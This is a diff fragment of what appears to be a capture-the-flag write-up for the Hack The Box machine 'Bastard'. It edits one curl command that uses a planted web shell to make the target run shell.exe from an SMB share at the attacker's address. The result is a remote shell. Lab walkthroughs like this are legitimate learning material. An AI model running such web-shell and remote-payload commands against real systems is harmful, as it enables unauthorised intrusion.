@@ -172,7 +172,8 @@ run
 And then I run, with curl, the executable:
 
 ```bash
-curl "http://bastard.htb/spread.php?cmd=cmd.exe%20%2Fc%20%22%5C%5C<IP>%5Cshares%5Cshell.exe%22"
+curl "http://bastard.htb/spread.php" \
+--data-urlencode 'cmd=cmd /c "\\<IP>\shares\shell.exe"' 
 ```
 
 In the user directory I found the flag.
